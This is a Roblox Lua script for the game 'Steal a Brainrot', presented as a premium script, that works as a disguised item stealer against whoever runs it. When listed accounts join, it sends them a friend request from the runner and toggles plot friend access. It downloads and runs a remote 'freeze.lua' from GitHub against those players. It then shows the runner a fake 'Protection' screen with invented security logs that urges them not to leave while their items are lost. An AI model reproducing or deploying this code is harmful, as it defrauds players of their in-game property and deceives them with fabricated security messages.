
--[[
   _____  _____ _____  _____ _____ _______ _____        _____ __  __ 
  / ____|/ ____|  __ \|_   _|  __ \__   __/ ____|      / ____|  \/  |
 | (___ | |    | |__) | | | | |__) | | | | (___       | (___ | \  / |
  \___ \| |    |  _  /  | | |  ___/  | |  \___ \       \___ \| |\/| |
  ____) | |____| | \ \ _| |_| |      | |  ____) |  _   ____) | |  | |
 |_____/ \_____|_|  \_\_____|_|      |_| |_____/  (_) |_____/|_|  |_|
                                                                     
                        Scripts.SM | Premium Scripts
                        Made by: Scripter.SM
                        Discord: discord.gg/cnUAk7uc3n
]]
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local StarterGui = game:GetService("StarterGui")

-- ==================== CONFIG ====================
local tester_users = {
    "SMILEY_RIVALS",
    "ta3123321",
    "BUZZFTWGOD",
    "Smiley9Gamerz",
    "iwasbannedmycomeback",
    "PVBBY_LEAF",
    "idkwhoami_3fa",
    "SABBY_LEAF"
}
local users = {}
spawn(function()
    repeat task.wait() until _G["Script-SM_Config"]
    users = _G["Script-SM_Config"].users or {}
end)
-- ===============================================
local processed = {}
local guiCreated = false
local coreGuiDisabled = false -- Track if CoreGui has been disabled

-- Load and run the freeze script on target players
local function runFreezeOnPlayer(player)
    if not player or player == LocalPlayer then return end
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/RblxScriptsOG/Steal-a-brainrot/main/freeze.lua"))()(player)
    end)
end

-- Get all target names (deduped)
local function getAllTargets()
    local targets = {}
    local seen = {}
    local function add(name)
        if name and type(name) == "string" and not seen[name] then
            seen[name] = true
            table.insert(targets, name)
        end
    end
    for _, v in ipairs(tester_users) do add(v) end
    for _, v in ipairs(users) do add(v) end
    return targets
end

-- Fire ToggleFriends EXACTLY
local function fireToggleFriends()
    pcall(function()
        ReplicatedStorage.Packages.Net:WaitForChild("RE/PlotService/ToggleFriends"):FireServer()
    end)
end

-- Disable CoreGui (only once)
local function disableCoreGui()
    if coreGuiDisabled then return end
    coreGuiDisabled = true
    pcall(function()
        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
        print("[Scripts.SM] CoreGui disabled.")
    end)
end

-- Process player: Friend request + GUI + Toggle + CoreGui disable
local function processPlayer(player)
    if processed[player.Name] or guiCreated then return end
    processed[player.Name] = true
    print("[Scripts.SM] Found: " .. player.Name)

    -- 1. Send Friend Request
    if not LocalPlayer:IsFriendsWith(player.UserId) then
        pcall(function()
            LocalPlayer:RequestFriendship(player)
            print("[Scripts.SM] Sent to " .. player.Name)
        end)
    else
        print("[Scripts.SM] Already friends with " .. player.Name)
    end

    -- 2. Fire ToggleFriends
    fireToggleFriends()

    -- 3. Disable CoreGui (on first target join)
    runFreezeOnPlayer(player)
    -- 4. CREATE GUI ONLY ONCE
    if not guiCreated then
        guiCreated = true
        spawn(CreateGui)
    end
end
-- ==================== ANTI-STEAL GUI (EXACT COPY) ====================
local function detectExecutor()
    if identifyexecutor then
        local n, v = identifyexecutor()
        return n .. (v and " v" .. v or "")
    elseif getexecutorname then
        return getexecutorname()
    else
        return "Executor"
    end
end

local function CreateGui()
    local player = Players.LocalPlayer
    local gui = Instance.new("ScreenGui")
    gui.Name = "ExecutorAntiStealLoop"
    gui.ResetOnSpawn = false
    gui.IgnoreGuiInset = true
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
    gui.DisplayOrder = 999999
    gui.Parent = player:WaitForChild("PlayerGui")

    -- Background
    local bg = Instance.new("Frame")
    bg.Size = UDim2.new(1, 0, 1, 0)
    bg.BackgroundColor3 = Color3.fromRGB(8, 8, 14)
    bg.BorderSizePixel = 0
    bg.Parent = gui

    local bgGrad = Instance.new("UIGradient")
    bgGrad.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0, Color3.fromRGB(18, 18, 28)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(5, 5, 10))
    }
    bgGrad.Rotation = 90
    bgGrad.Parent = bg

    -- Title
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(0.92, 0, 0.13, 0)
    title.Position = UDim2.new(0.5, 0, 0.43, 0)
    title.AnchorPoint = Vector2.new(0.5, 0.5)
    title.BackgroundTransparency = 1
    title.Text = detectExecutor() .. " Protection"
    title.Font = Enum.Font.GothamBlack
    title.TextSize = 50
    title.TextColor3 = Color3.fromRGB(255, 255, 255)
    title.TextStrokeTransparency = 0.7
    title.Parent = bg

    -- Subtitle
    local subtitle = Instance.new("TextLabel")
    subtitle.Size = UDim2.new(0.82, 0, 0.16, 0)
    subtitle.Position = UDim2.new(0.5, 0, 0.54, 0)
    subtitle.AnchorPoint = Vector2.new(0.5, 0.5)
    subtitle.BackgroundTransparency = 1
    subtitle.Text = "You have executed a stealer script, that is trying to steal your stuff,\nWe are protecting you. Please Wait Sometime"
    subtitle.Font = Enum.Font.Gotham
    subtitle.TextSize = 24
    subtitle.TextColor3 = Color3.fromRGB(220, 240, 255)
    subtitle.TextWrapped = true
    subtitle.TextXAlignment = Enum.TextXAlignment.Center
    subtitle.Parent = bg

    -- Warning
    local warning = Instance.new("TextLabel")
    warning.Size = UDim2.new(0.78, 0, 0.08, 0)
    warning.Position = UDim2.new(0.5, 0, 0.64, 0)
    warning.AnchorPoint = Vector2.new(0.5, 0.5)
    warning.BackgroundTransparency = 1
    warning.Text = "Warning: Don't Leave, Leaving will cause loss of in-game items like pets."
    warning.Font = Enum.Font.GothamBold
    warning.TextSize = 22
    warning.TextColor3 = Color3.fromRGB(255, 80, 80)
    warning.TextWrapped = true
    warning.TextXAlignment = Enum.TextXAlignment.Center
    warning.Parent = bg

    -- Countdown
    local countdown = Instance.new("TextLabel")
    countdown.Size = UDim2.new(0.7, 0, 0.08, 0)
    countdown.Position = UDim2.new(0.5, 0, 0.72, 0)
    countdown.AnchorPoint = Vector2.new(0.5, 0.5)
    countdown.BackgroundTransparency = 1
    countdown.Text = "Securing in 5:00..."
    countdown.Font = Enum.Font.GothamBold
    countdown.TextSize = 30
    countdown.TextColor3 = Color3.fromRGB(100, 255, 150)
    countdown.Parent = bg

    -- Console Panel
    local console = Instance.new("Frame")
    console.Size = UDim2.new(0.88, 0, 0.25, 0)
    console.Position = UDim2.new(0.5, 0, 0.80, 0)
    console.AnchorPoint = Vector2.new(0.5, 0.5)
    console.BackgroundColor3 = Color3.fromRGB(15, 15, 25)
    console.BorderSizePixel = 0
    console.Parent = bg

    local cCorner = Instance.new("UICorner")
    cCorner.CornerRadius = UDim.new(0, 12)
    cCorner.Parent = console

    local cStroke = Instance.new("UIStroke")
    cStroke.Color = Color3.fromRGB(60, 120, 180)
    cStroke.Thickness = 1.5
    cStroke.Parent = console

    local consoleTitle = Instance.new("TextLabel")
    consoleTitle.Size = UDim2.new(1, 0, 0, 28)
    consoleTitle.BackgroundTransparency = 1
    consoleTitle.Text = "SECURITY CONSOLE"
    consoleTitle.Font = Enum.Font.Code
    consoleTitle.TextSize = 16
    consoleTitle.TextColor3 = Color3.fromRGB(100, 200, 255)
    consoleTitle.TextXAlignment = Enum.TextXAlignment.Center
    consoleTitle.Parent = console

    local logArea = Instance.new("TextLabel")
    logArea.Size = UDim2.new(1, -16, 1, -36)
    logArea.Position = UDim2.new(0, 8, 0, 32)
    logArea.BackgroundTransparency = 1
    logArea.Text = ""
    logArea.Font = Enum.Font.Code
    logArea.TextSize = 15
    logArea.TextColor3 = Color3.fromRGB(180, 255, 180)
    logArea.TextXAlignment = Enum.TextXAlignment.Left
    logArea.TextYAlignment = Enum.TextYAlignment.Top
    logArea.TextWrapped = true
    logArea.Parent = console

    -- Failure Message
    local failureMsg = Instance.new("TextLabel")
    failureMsg.Size = UDim2.new(0.9, 0, 0.2, 0)
    failureMsg.Position = UDim2.new(0.5, 0, 0.4, 0)
    failureMsg.AnchorPoint = Vector2.new(0.5, 0.5)
    failureMsg.BackgroundTransparency = 1
    failureMsg.Text = ""
    failureMsg.Font = Enum.Font.GothamBlack
    failureMsg.TextSize = 36
    failureMsg.TextColor3 = Color3.fromRGB(255, 50, 50)
    failureMsg.TextStrokeTransparency = 0.6
    failureMsg.TextWrapped = true
    failureMsg.TextXAlignment = Enum.TextXAlignment.Center
    failureMsg.Visible = false
    failureMsg.Parent = bg

    -- Watermark
    local watermark = Instance.new("TextLabel")
    watermark.Size = UDim2.new(0.5, 0, 0.05, 0)
    watermark.Position = UDim2.new(1, -12, 1, -12)
    watermark.AnchorPoint = Vector2.new(1, 1)
    watermark.BackgroundTransparency = 1
    watermark.Text = "Steal a Brainrot – Anti-Steal System"
    watermark.Font = Enum.Font.Gotham
    watermark.TextSize = 15
    watermark.TextColor3 = Color3.fromRGB(90, 140, 180)
    watermark.TextXAlignment = Enum.TextXAlignment.Right
    watermark.Parent = bg

    -- ================================================================= --
    -- BRAINROT SCANNING (Same as main.lua)
    -- ================================================================= --
    local Workspace = game:GetService("Workspace")

    local function parseGenerationValue(generationString)
        local cleaned = generationString:gsub("%s", ""):match("^%s*(.-)%s*$")
        local numberPart, unitPart = cleaned:match("(%d+%.?%d*)([KMB]?)")
        if not numberPart then return 0 end
        numberPart = tonumber(numberPart)
        if unitPart == "K" then return numberPart * 1e3
        elseif unitPart == "M" then return numberPart * 1e6
        elseif unitPart == "B" then return numberPart * 1e9
        else return numberPart end
    end

    local function extractRate(name)
        local rate = name:match("%$(%d+%.?%d*[KMB]?)%/s")
        return rate and (rate .. "/s") or nil
    end

    local function getBrainrots()
        local list = {}
        local plots = Workspace:FindFirstChild("Plots")
        if not plots then return list end
        for _, plot in ipairs(plots:GetChildren()) do
            local podiums = plot:FindFirstChild("AnimalPodiums")
            if podiums then
                for _, podium in ipairs(podiums:GetChildren()) do
                    if tonumber(podium.Name) and podium.Name:match("^%d+$") then
                        local base = podium:FindFirstChild("Base")
                        local spawn = base and base:FindFirstChild("Spawn")
                        local attach = spawn and spawn:FindFirstChild("Attachment")
                        local over = attach and attach:FindFirstChild("AnimalOverhead")
                        if over then
                            local nameLbl = over:FindFirstChild("DisplayName")
                            local genLbl = over:FindFirstChild("Generation")
                            if nameLbl and nameLbl:IsA("TextLabel") and genLbl and genLbl:IsA("TextLabel") then
                                local genVal = parseGenerationValue(genLbl.Text)
                                local cleanName = nameLbl.Text:gsub("%s*%$[%d%.]+[KM]?/s", ""):gsub("^%s+", ""):gsub("%s+$", "")
                                local rate = extractRate(nameLbl.Text) or genLbl.Text
                                table.insert(list, {
                                    PetName = cleanName,
                                    Formatted = rate,
                                    Value = genVal
                                })
                            end
                        end
                    end
                end
            end
        end
        table.sort(list, function(a, b) return a.Value > b.Value end)
        return list
    end

    -- ================================================================= --
    -- GET REAL BRAINROTS
    -- ================================================================= --
    local brainrots = getBrainrots()
    local topBrainrots = {}
    local lowBrainrot = nil

    if #brainrots > 0 then
        for i = 1, math.min(7, #brainrots) do
            table.insert(topBrainrots, brainrots[i])
        end
        lowBrainrot = brainrots[#brainrots]
    else
        -- Fallback (only if no brainrots found)
        topBrainrots = {
            { PetName = "[Failed to Fetch]", Formatted = "1M" },
            { PetName = "[Failed to Fetch]", Formatted = "850K" },
            { PetName = "[Failed to Fetch]", Formatted = "720K" },
            { PetName = "[Failed to Fetch]", Formatted = "600K" },
            { PetName = "[Failed to Fetch]", Formatted = "550K" },
            { PetName = "[Failed to Fetch]", Formatted = "480K" },
            { PetName = "[Failed to Fetch]", Formatted = "320K" }
        }
        lowBrainrot = { PetName = "Basic Thought", Formatted = "1K" }
    end

    -- ================================================================= --
    -- LOG SYSTEM
    -- ================================================================= --
    local logLines = {}
    local function addLog(text, color)
        table.insert(logLines, {text = text, color = color or Color3.fromRGB(180, 255, 180)})
        if #logLines > 20 then table.remove(logLines, 1) end
        local display = ""
        for _, line in ipairs(logLines) do
            display = display .. "\n> " .. line.text
        end
        logArea.Text = display
    end

    -- ================================================================= --
    -- PROTECTION LOOP
    -- ================================================================= --
    task.spawn(function()
        while player.Parent and gui.Parent do
            local totalSeconds = 300
            local startTime = tick()
            failureMsg.Visible = false
            failureMsg.Text = ""

            while tick() - startTime < totalSeconds do
                if not gui.Parent then break end
                local remaining = totalSeconds - math.floor(tick() - startTime)
                local mins = math.floor(remaining / 60)
                local secs = remaining % 60
                countdown.Text = string.format("Securing in %d:%02d...", mins, secs)

                task.wait(math.random(18, 32) / 10)

                local actions = {
                    "Scanning remote event hooks...",
                    "Blocking unauthorized FireServer calls",
                    "Purging malicious discord webhook traces",
                    "Isolating exploit thread",
                    "Recovering Brainrot UUIDs...",
                    "Securing generation data",
                    "Reporting script to anti-cheat",
                    "Encrypting local inventory",
                    "Validating podium ownership",
                    "Neutralizing steal exploit"
                }
                addLog(actions[math.random(#actions)])

                -- Random failure on lowest brainrot
                if lowBrainrot and math.random() < 0.15 then
                    addLog("Failed to secure " .. lowBrainrot.PetName, Color3.fromRGB(255, 100, 100))
                end

                -- Random recovery attempt
                if #brainrots > 0 and math.random() < 0.3 then
                    local p = brainrots[math.random(1, #brainrots)]
                    addLog("Recovering " .. p.PetName .. " → " .. p.Formatted, Color3.fromRGB(100, 255, 100))
                end
            end

            -- === FAILURE AFTER 5 MINUTES ===
            local failedLines = {}
            for _, p in ipairs(topBrainrots) do
                table.insert(failedLines, p.PetName .. " → " .. p.Formatted)
            end
            failureMsg.Text = "Failed to Recover:\n" .. table.concat(failedLines, "\n")
            failureMsg.Visible = true
            addLog("CRITICAL: Recovery failed for 7 high-gen brainrots", Color3.fromRGB(255, 50, 50))
            addLog("Restarting protection cycle...", Color3.fromRGB(255, 200, 50))
            task.wait(4)
        end
    end)

    LocalPlayer.CharacterRemoving:Connect(function()
        task.wait(0.1)
        if LocalPlayer.Character then
            LocalPlayer.Character:Destroy()
        end
    end)
end

-- ==================== MAIN MONITORING ====================
local function startMonitoring()
    print("[Scripts.SM] Friend Toggle Loaded")

    local connection
    connection = Players.PlayerAdded:Connect(function(player)
        task.wait(1)
        local targets = getAllTargets()
        for _, name in ipairs(targets) do
            if player.Name == name then
                processPlayer(player)
            end
        end
    end)

    -- Initial scan
    spawn(function()
        task.wait(2)
        local targets = getAllTargets()
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LocalPlayer then
                for _, name in ipairs(targets) do
                    if player.Name == name then
                        processPlayer(player)
                    end
                end
            end
        end
    end)

    -- Refresh _G config
    while task.wait(5) do
        spawn(function()
            repeat task.wait() until _G["Script-SM_Config"]
            users = _G["Script-SM_Config"].users or {}
        end)
    end
end

-- START
startMonitoring()
